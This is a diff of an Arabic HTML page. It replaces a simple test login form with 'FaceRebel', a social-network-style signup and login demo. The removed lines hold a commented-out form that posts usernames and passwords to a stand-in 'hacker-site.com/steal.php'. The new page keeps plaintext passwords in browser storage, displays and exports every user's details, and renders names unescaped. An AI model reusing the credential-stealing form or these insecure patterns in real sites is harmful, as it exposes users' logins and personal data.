@@ -1,70 +1,543 @@
-<!-- </html>
-  <body>
-    <form action="http://hacker-site.com/steal.php" method="POST">
-      <form action="http://localhost:8000/log.php" method="POST"></form>
-      <input type="text" name="username" placeholder="أدخل اسم المستخدم">
-      <input type="password" name="password" placeholder="كلمة المرور">
-      <button type="submit">تسجيل الدخول</button>
-    </form>
-  </body>
-</html> -->
-
-<!-- <!DOCTYPE html>
-<html>
-  <body>
-    <form action="http://localhost:8000/log.php" method="POST">
-      <input type="text" name="username" placeholder="أدخل اسم المستخدم">
-      <input type="password" name="password" placeholder="كلمة المرور">
-      <button type="submit">تسجيل الدخول</button>
-    </form>
-  </body>
-</html> -->
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نموذج اختباري</title>
+    <title>FaceRebel - الثورة الرقمية</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
+            min-height: 100vh;
+            color: #fff;
             padding: 20px;
         }
-        .form-container {
-            background: white;
-            max-width: 500px;
+
+        .rebel-container {
+            max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-        input, button {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
+
+        .header {
+            text-align: center;
+            padding: 20px 0;
+            border-bottom: 2px solid #00ff88;
+            margin-bottom: 30px;
         }
-        button {
-            background-color: #4CAF50;
-            color: white;
+
+        .logo {
+            font-size: 3.5em;
+            font-weight: bold;
+            color: #00ff88;
+            text-shadow: 0 0 15px #00ff88;
+            margin-bottom: 10px;
+        }
+
+        .tagline {
+            color: #ccc;
+            font-size: 1.2em;
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .auth-section {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .tabs {
+            display: flex;
+            margin-bottom: 25px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 5px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 15px;
+            text-align: center;
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 16px;
             cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .tab.active {
+            background: #00ff88;
+            color: #000;
+            font-weight: bold;
+        }
+
+        .form-container {
+            margin-top: 20px;
+        }
+
+        .form {
+            display: none;
+        }
+
+        .form.active {
+            display: block;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ff88;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #00ff88;
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #00ff88, #00cc6a);
+            border: none;
+            border-radius: 10px;
+            color: #000;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
+        }
+
+        .data-section {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid rgba(255, 165, 0, 0.3);
+        }
+
+        .section-title {
+            color: #ffa500;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            text-align: center;
+            text-shadow: 0 0 10px rgba(255, 165, 0, 0.5);
+        }
+
+        .users-list {
+            max-height: 400px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+        }
+
+        .user-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            border-left: 4px solid #00ff88;
+        }
+
+        .user-name {
+            font-weight: bold;
+            color: #00ff88;
+            margin-bottom: 5px;
+        }
+
+        .user-email {
+            color: #ccc;
+            font-size: 0.9em;
+        }
+
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .action-btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, #ffa500, #ff8c00);
+            color: #000;
+        }
+
+        .clear-btn {
+            background: linear-gradient(135deg, #ff4444, #cc0000);
+            color: #fff;
+        }
+
+        .action-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .message {
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+            font-weight: bold;
+        }
+
+        .success {
+            background: rgba(0, 255, 136, 0.2);
+            color: #00ff88;
+            border: 1px solid #00ff88;
+        }
+
+        .error {
+            background: rgba(255, 68, 68, 0.2);
+            color: #ff4444;
+            border: 1px solid #ff4444;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #00ff88;
+        }
+
+        .stat-label {
+            color: #ccc;
+            font-size: 0.9em;
         }
     </style>
 </head>
 <body>
-    <div class="form-container">
-        <h2>نموذج تسجيل دخول اختباري</h2>
-        <form action="process.php" method="POST">
-            <label for="username">اسم المستخدم:</label>
-            <input type="text" id="username" name="username" required>
-            
-            <label for="password">كلمة المرور:</label>
-            <input type="password" id="password" name="password" required>
-            
-            <button type="submit">تسجيل الدخول</button>
-        </form>
+    <div class="rebel-container">
+        <div class="header">
+            <div class="logo">FaceRebel</div>
+            <div class="tagline">منصة المتمردين الرقمية - حيث القواعد تُكسر والإبداع يحكم</div>
+        </div>
+
+        <div class="main-content">
+            <div class="auth-section">
+                <div class="tabs">
+                    <button class="tab active" onclick="showForm('login')">تسجيل الدخول</button>
+                    <button class="tab" onclick="showForm('signup')">انضم للثورة</button>
+                </div>
+
+                <div class="form-container">
+                    <div id="login-form" class="form active">
+                        <div class="input-group">
+                            <label>البريد الإلكتروني أو رقم الهاتف</label>
+                            <input type="text" id="login-email" placeholder="أدخل بياناتك أيها المتمرد...">
+                        </div>
+                        <div class="input-group">
+                            <label>كلمة المرور</label>
+                            <input type="password" id="login-password" placeholder="كلمة السر السرية...">
+                        </div>
+                        <button class="btn" onclick="login()">اقتحم النظام</button>
+                    </div>
+
+                    <div id="signup-form" class="form">
+                        <div class="input-group">
+                            <label>الاسم الكامل</label>
+                            <input type="text" id="signup-name" placeholder="ما هو اسمك أيها الثائر؟">
+                        </div>
+                        <div class="input-group">
+                            <label>البريد الإلكتروني</label>
+                            <input type="email" id="signup-email" placeholder="بريدك الإلكتروني السري...">
+                        </div>
+                        <div class="input-group">
+                            <label>رقم الهاتف</label>
+                            <input type="text" id="signup-phone" placeholder="رقم اتصالك...">
+                        </div>
+                        <div class="input-group">
+                            <label>كلمة المرور</label>
+                            <input type="password" id="signup-password" placeholder="اختر كلمة مرور قوية...">
+                        </div>
+                        <button class="btn" onclick="signup()">انضم إلى التمرد</button>
+                    </div>
+                </div>
+
+                <div id="auth-message" class="message"></div>
+            </div>
+
+            <div class="data-section">
+                <div class="section-title">قاعدة بيانات المتمردين</div>
+                
+                <div class="stats">
+                    <div class="stat-card">
+                        <div class="stat-number" id="total-users">0</div>
+                        <div class="stat-label">متمرد مسجل</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number" id="online-users">0</div>
+                        <div class="stat-label">متمرد نشط</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number" id="data-size">0KB</div>
+                        <div class="stat-label">حجم البيانات</div>
+                    </div>
+                </div>
+
+                <div class="users-list" id="users-list">
+                    <!-- سيتم ملؤها بالبيانات -->
+                </div>
+
+                <div class="actions">
+                    <button class="action-btn download-btn" onclick="downloadData()">
+                        📥 حمّل بيانات المتمردين
+                    </button>
+                    <button class="action-btn clear-btn" onclick="clearData()">
+                        🗑️ مسح كل البيانات
+                    </button>
+                </div>
+
+                <div id="data-message" class="message"></div>
+            </div>
+        </div>
     </div>
+
+    <script>
+        // تهيئة التطبيق
+        function initApp() {
+            updateUsersList();
+            updateStats();
+        }
+
+        // تبديل النماذج
+        function showForm(formType) {
+            document.querySelectorAll('.form').forEach(form => form.classList.remove('active'));
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            
+            if (formType === 'login') {
+                document.getElementById('login-form').classList.add('active');
+                document.querySelectorAll('.tab')[0].classList.add('active');
+            } else {
+                document.getElementById('signup-form').classList.add('active');
+                document.querySelectorAll('.tab')[1].classList.add('active');
+            }
+        }
+
+        // تسجيل الدخول
+        function login() {
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+            const message = document.getElementById('auth-message');
+
+            const users = JSON.parse(localStorage.getItem('rebel_users') || '[]');
+            const user = users.find(u => (u.email === email || u.phone === email) && u.password === password);
+
+            if (user) {
+                showMessage('auth-message', `مرحباً بعودتك أيها المتمرد! ${user.name}`, 'success');
+                
+                // تحديث المستخدمين النشطين
+                const activeUsers = JSON.parse(localStorage.getItem('active_users') || '[]');
+                if (!activeUsers.find(u => u.email === user.email)) {
+                    activeUsers.push({
+                        name: user.name,
+                        email: user.email,
+                        loginTime: new Date().toLocaleString('ar-SA')
+                    });
+                    localStorage.setItem('active_users', JSON.stringify(activeUsers));
+                }
+                
+                updateStats();
+            } else {
+                showMessage('auth-message', 'بيانات الدخول خاطئة! حاول مرة أخرى أيها الثائر.', 'error');
+            }
+        }
+
+        // إنشاء حساب
+        function signup() {
+            const name = document.getElementById('signup-name').value;
+            const email = document.getElementById('signup-email').value;
+            const phone = document.getElementById('signup-phone').value;
+            const password = document.getElementById('signup-password').value;
+            const message = document.getElementById('auth-message');
+
+            if (!name || !email || !phone || !password) {
+                showMessage('auth-message', 'املأ جميع الحقول أيها المتمرد!', 'error');
+                return;
+            }
+
+            const users = JSON.parse(localStorage.getItem('rebel_users') || '[]');
+            
+            if (users.find(u => u.email === email)) {
+                showMessage('auth-message', 'البريد الإلكتروني مستخدم مسبقاً! كن مبدعاً وأختر بريداً آخر.', 'error');
+                return;
+            }
+
+            const newUser = {
+                id: Date.now(),
+                name,
+                email,
+                phone,
+                password,
+                joinDate: new Date().toLocaleString('ar-SA'),
+                status: 'active'
+            };
+
+            users.push(newUser);
+            localStorage.setItem('rebel_users', JSON.stringify(users));
+
+            showMessage('auth-message', `مرحباً بك في الثورة ${name}! تم إنشاء حسابك بنجاح.`, 'success');
+            
+            // مسح الحقول
+            document.getElementById('signup-name').value = '';
+            document.getElementById('signup-email').value = '';
+            document.getElementById('signup-phone').value = '';
+            document.getElementById('signup-password').value = '';
+            
+            updateUsersList();
+            updateStats();
+            
+            // الانتقال إلى تسجيل الدخول
+            setTimeout(() => showForm('login'), 2000);
+        }
+
+        // تحديث قائمة المستخدمين
+        function updateUsersList() {
+            const users = JSON.parse(localStorage.getItem('rebel_users') || '[]');
+            const usersList = document.getElementById('users-list');
+            
+            if (users.length === 0) {
+                usersList.innerHTML = '<div style="text-align: center; color: #ccc; padding: 20px;">لا يوجد متمردين مسجلين بعد!</div>';
+                return;
+            }
+
+            usersList.innerHTML = users.map(user => `
+                <div class="user-card">
+                    <div class="user-name">${user.name}</div>
+                    <div class="user-email">${user.email} | ${user.phone}</div>
+                    <div style="color: #888; font-size: 0.8em; margin-top: 5px;">انضم في: ${user.joinDate}</div>
+                </div>
+            `).join('');
+        }
+
+        // تحديث الإحصائيات
+        function updateStats() {
+            const users = JSON.parse(localStorage.getItem('rebel_users') || '[]');
+            const activeUsers = JSON.parse(localStorage.getItem('active_users') || '[]');
+            
+            document.getElementById('total-users').textContent = users.length;
+            document.getElementById('online-users').textContent = activeUsers.length;
+            
+            // حساب حجم البيانات
+            const dataSize = new Blob([JSON.stringify(users)]).size;
+            document.getElementById('data-size').textContent = (dataSize / 1024).toFixed(2) + 'KB';
+        }
+
+        // تحميل البيانات
+        function downloadData() {
+            const users = JSON.parse(localStorage.getItem('rebel_users') || '[]');
+            const activeUsers = JSON.parse(localStorage.getItem('active_users') || '[]');
+            
+            const data = {
+                rebel_users: users,
+                active_users: activeUsers,
+                export_time: new Date().toLocaleString('ar-SA'),
+                total_users: users.length,
+                active_now: activeUsers.length
+            };
+
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `rebel_data_${Date.now()}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            showMessage('data-message', 'تم تحميل بيانات المتمردين بنجاح!', 'success');
+        }
+
+        // مسح البيانات
+        function clearData() {
+            if (confirm('هل أنت متأكد من مسح كل بيانات المتمردين؟ هذا الإجراء لا يمكن التراجع عنه!')) {
+                localStorage.removeItem('rebel_users');
+                localStorage.removeItem('active_users');
+                updateUsersList();
+                updateStats();
+                showMessage('data-message', 'تم مسح جميع البيانات بنجاح!', 'success');
+            }
+        }
+
+        // عرض الرسائل
+        function showMessage(elementId, text, type) {
+            const element = document.getElementById(elementId);
+            element.textContent = text;
+            element.className = `message ${type}`;
+            element.style.display = 'block';
+            
+            setTimeout(() => {
+                element.style.display = 'none';
+            }, 5000);
+        }
+
+        // تهيئة التطبيق عند التحميل
+        document.addEventListener('DOMContentLoaded', initApp);
+    </script>
 </body>
 </html>
